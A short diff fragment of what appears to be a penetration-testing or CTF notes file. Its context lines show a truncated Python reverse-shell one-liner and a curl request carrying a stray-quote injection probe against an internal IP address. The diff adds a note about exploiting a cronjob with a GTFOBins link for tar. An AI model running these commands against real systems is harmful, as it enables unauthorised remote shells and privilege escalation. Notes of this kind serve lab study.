@@ -14,3 +14,5 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 curl -H 'Host: http://172.16.226.6' "http://172.16.226.6/'"
 ```
+to exploit a cronjob
+https://gtfobins.github.io/gtfobins/tar/
